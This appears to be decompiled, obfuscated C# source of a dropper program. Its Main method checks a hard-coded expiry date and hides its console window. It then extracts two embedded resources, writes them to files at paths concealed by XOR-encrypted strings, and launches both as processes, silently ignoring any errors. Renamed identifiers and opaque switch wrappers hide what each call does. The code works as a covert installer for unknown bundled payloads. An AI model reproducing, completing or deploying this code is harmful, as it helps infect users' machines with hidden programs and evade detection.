using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Policy;
using ns2;
using ns3;

namespace ns1;

internal sealed class Class0
{
	internal sealed class Class1
	{
		private static bool bool_0;

		internal static Stream smethod_0(Assembly assembly_0, string string_0, int int_0, int int_1)
		{
			while (true)
			{
				switch (int_1 ^ int_0)
				{
				case 83:
					return Class5.Class6.Class7.smethod_2(assembly_0, string_0, 644, 708);
				}
			}
		}

		internal static void smethod_1(Stream stream_0, int int_0, int int_1)
		{
			while (true)
			{
				switch (int_1 ^ int_0)
				{
				case 116:
					Class10.smethod_2(stream_0, 788, 796);
					return;
				case 117:
					Class5.smethod_6(stream_0, 195, 129);
					return;
				}
			}
		}

		internal static void smethod_2(Stream stream_0, byte[] byte_0, int int_0, int int_1, int int_2, int int_3)
		{
			while (true)
			{
				switch (int_3 ^ int_2)
				{
				case 81:
					Class10.smethod_1(stream_0, byte_0, int_0, int_1, 102, 113);
					return;
				}
			}
		}

		internal static ProcessStartInfo smethod_3(Process process_0, int int_0, int int_1)
		{
			while (true)
			{
				switch (int_1 ^ int_0)
				{
				case 84:
					return Class5.smethod_1(process_0, 297, 318);
				}
			}
		}

		internal static void smethod_4(ProcessStartInfo processStartInfo_0, string string_0, int int_0, int int_1)
		{
			while (true)
			{
				switch (int_1 ^ int_0)
				{
				case 50:
					Class5.Class6.smethod_1(processStartInfo_0, string_0, 267, 280);
					return;
				}
			}
		}

		internal static void smethod_5()
		{
			if (bool_0)
			{
				return;
			}
			Type object_;
			Class5.smethod_2(object_ = Class10.smethod_3(typeof(Class1).TypeHandle, 166, 163), 773, 780);
			try
			{
				if (!bool_0)
				{
					bool_0 = true;
					Class5.Class6.smethod_2(Class5.Class6.Class7.smethod_3(589, 598), Class3.smethod_2, 406, 504);
				}
			}
			finally
			{
				Class5.smethod_2(object_, 539, 529);
			}
		}

		internal static AppDomain smethod_6(int int_0, int int_1)
		{
			while (true)
			{
				switch (int_1 ^ int_0)
				{
				case 70:
					return Class5.Class6.Class7.smethod_3(853, 846);
				}
			}
		}

		internal static Evidence smethod_7(Assembly assembly_0, int int_0, int int_1)
		{
			while (true)
			{
				switch (int_1 ^ int_0)
				{
				case 2:
					return Class5.Class6.smethod_3(assembly_0, 836, 805);
				}
			}
		}
	}

	[StructLayout(LayoutKind.Auto)]
	internal struct Struct0
	{
		internal byte[] byte_0;
	}

	internal sealed class Class2
	{
		internal static DateTime smethod_0(int int_0, int int_1)
		{
			while (true)
			{
				switch (int_1 ^ int_0)
				{
				case 115:
					return Class10.Class11.smethod_3(470, 413);
				}
			}
		}

		internal static char[] smethod_1(string string_0, int int_0, int int_1)
		{
			while (true)
			{
				switch (int_1 ^ int_0)
				{
				case 126:
					return Class10.smethod_4(string_0, 78, 68);
				}
			}
		}

		internal static long smethod_2(Stream stream_0, int int_0, int int_1)
		{
			while (true)
			{
				switch (int_1 ^ int_0)
				{
				case 90:
					return Class10.smethod_5(stream_0, 159, 170);
				}
			}
		}

		internal static int smethod_3(Stream stream_0, byte[] byte_0, int int_0, int int_1, int int_2, int int_3)
		{
			while (true)
			{
				switch (int_3 ^ int_2)
				{
				case 67:
					return Class5.Class6.smethod_0(stream_0, byte_0, int_0, int_1, 683, 662);
				}
			}
		}

		internal static string smethod_4(string string_0, int int_0, int int_1)
		{
			while (true)
			{
				switch (int_1 ^ int_0)
				{
				case 66:
					return Class5.Class6.Class7.smethod_0(string_0, 1, 53);
				}
			}
		}

		internal static Assembly smethod_5(int int_0, int int_1)
		{
			while (true)
			{
				switch (int_1 ^ int_0)
				{
				case 56:
					return Class10.Class11.smethod_4(852, 822);
				}
			}
		}

		internal static object smethod_6(AppDomain appDomain_0, string string_0, int int_0, int int_1)
		{
			while (true)
			{
				switch (int_1 ^ int_0)
				{
				case 53:
					return Class10.Class11.smethod_1(appDomain_0, string_0, 1001, 988);
				}
			}
		}

		internal static void smethod_7(AppDomain appDomain_0, string string_0, object object_0, int int_0, int int_1)
		{
			while (true)
			{
				switch (int_1 ^ int_0)
				{
				case 121:
					Class5.Class6.Class7.smethod_4(appDomain_0, string_0, object_0, 604, 539);
					return;
				case 122:
					Class5.Class6.Class8.smethod_2(appDomain_0, string_0, object_0, 503, 420);
					return;
				}
			}
		}

		internal static byte[] smethod_8(MemoryStream memoryStream_0, int int_0, int int_1)
		{
			while (true)
			{
				switch (int_1 ^ int_0)
				{
				case 32:
					return Class10.smethod_6(memoryStream_0, 766, 702);
				}
			}
		}
	}

	[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 16)]
	private struct Struct1
	{
	}

	public static FileStream fileStream_0;

	public static FileStream fileStream_1;

	private static readonly char[] char_0;

	private static readonly char[] char_1;

	private static readonly string[] string_0;

	internal static Struct1 struct1_0/* Not supported: data(00 00 05 00 00 00 CE 23 9C 30 E5 15 DB 01 F7 13) */;

	[DllImport("kernel32.dll")]
	public static extern bool FreeConsole();

	private static void Main(string[] args)
	{
		Class1.smethod_5();
		if (smethod_0(Class2.smethod_0(832, 819), new DateTime(635540974813545411L), 532, 610))
		{
			throw new Exception();
		}
		try
		{
			FreeConsole();
			Stream stream_ = Class1.smethod_0(smethod_1(154, 237), Class3.smethod_0(Class3.smethod_4(67521167, 1), 57495), 73, 26);
			byte[] array = new byte[Class2.smethod_2(stream_, 877, 823)];
			Class2.smethod_3(stream_, array, 0, array.Length, 280, 347);
			Class1.smethod_1(stream_, 887, 771);
			Stream stream_2 = Class1.smethod_0(smethod_1(306, 325), Class3.smethod_0(Class3.smethod_4(67521154, 4), 57972), 63, 108);
			byte[] array2 = new byte[Class2.smethod_2(stream_2, 426, 496)];
			Class2.smethod_3(stream_2, array2, 0, array2.Length, 383, 316);
			fileStream_0 = new FileStream(Class3.smethod_5(Class2.smethod_4(Class3.smethod_0(Class3.smethod_4(67521178, 4), 60593), 73, 11), Class3.smethod_0(Class3.smethod_4(67521185, 6), 62598), 96, 113), FileMode.Create);
			Class1.smethod_2(fileStream_0, array, 0, array.Length, 184, 233);
			Class1.smethod_1(fileStream_0, 518, 626);
			Class1.smethod_1(fileStream_0, 501, 384);
			fileStream_1 = new FileStream(Class3.smethod_5(Class2.smethod_4(Class3.smethod_0(Class3.smethod_4(67521183, 1), 60593), 638, 572), Class3.smethod_0(Class3.smethod_4(67521203, 6), 59368), 836, 853), FileMode.Create);
			Class1.smethod_2(fileStream_1, array2, 0, array2.Length, 310, 359);
			Class1.smethod_1(fileStream_1, 239, 155);
			Class1.smethod_1(fileStream_1, 558, 603);
			Process process_ = new Process();
			Class5.Class6.smethod_1(Class5.smethod_1(process_, 940, 955), Class10.Class11.smethod_2(Class5.Class6.Class7.smethod_0(Class3.smethod_0(Class3.smethod_4(67521177, 7), 60593), 685, 665), Class3.smethod_0(Class3.smethod_4(67521190, 1), 62598), 137, 221), 557, 574);
			Class5.Class6.smethod_4(process_, 705, 706);
			Class10.Class11.smethod_5(process_, 784, 891);
			Process process_2 = new Process();
			Class5.Class6.Class7.smethod_7(Class5.smethod_1(process_2, 978, 965), Class5.Class6.Class7.smethod_5(Class5.Class6.Class7.smethod_0(Class3.smethod_0(Class3.smethod_4(67521182, 0), 60593), 841, 893), Class3.smethod_0(Class3.smethod_4(67521206, 3), 59368), 395, 400), 153, 179);
			Class5.Class6.Class8.smethod_5(process_2, 263, 303);
		}
		catch
		{
		}
	}

	static Class0()
	{
		char[] array_ = new char[8];
		Class10.Class11.smethod_0(array_, (RuntimeFieldHandle)/*OpCode not supported: LdMemberToken*/, 905, 899);
		char_1 = array_;
		char[] array = new char[8];
		array[7] = 'ᣃ';
		array[0] = '⏣';
		array[6] = '^';
		array[2] = 'ᗔ';
		array[3] = 'Ǣ';
		array[4] = 'Ꮅ';
		array[1] = 'ォ';
		array[5] = '⎂';
		string_0 = new string[1];
		char_0 = array;
		Class1.smethod_5();
	}

	internal static bool smethod_0(DateTime dateTime_0, DateTime dateTime_1, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 118:
				return Class5.smethod_3(dateTime_0, dateTime_1, 699, 643);
			}
		}
	}

	internal static Assembly smethod_1(int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 119:
				return Class10.Class11.smethod_4(653, 751);
			}
		}
	}

	internal static string smethod_2(int int_0, int int_1)
	{
		int num = int_0 ^ 0x4064A8E ^ int_1;
		char[] array = char_1;
		int num2 = array[num];
		string result;
		if ((result = string_0[num2]) != null)
		{
			return result;
		}
		int num3 = array[num + 1];
		num3 = (int)((uint)array[num + 2] << 16) + num3;
		char[] array2 = new char[num3];
		char[] array3 = char_0;
		int num4 = array3.Length;
		num += 3;
		for (int num5 = 0; num5 < num3; num5 = 1 + num5)
		{
			array2[num5] = (char)(array[num + num5] ^ array3[(num5 + num2) % num4]);
		}
		result = new string(array2);
		string_0[num2] = result;
		return result;
	}

	internal static int smethod_3(Stream stream_0, byte[] byte_0, int int_0, int int_1, int int_2, int int_3)
	{
		while (true)
		{
			switch (int_3 ^ int_2)
			{
			case 88:
				return Class5.Class6.smethod_0(stream_0, byte_0, int_0, int_1, 493, 464);
			}
		}
	}

	internal static Assembly smethod_4(byte[] byte_0, byte[] byte_1, Evidence evidence_0, int int_0, int int_1)
	{
		while (true)
		{
			switch (int_1 ^ int_0)
			{
			case 9:
				return Class5.smethod_4(byte_0, byte_1, evidence_0, 244, 168);
			}
		}
	}
}
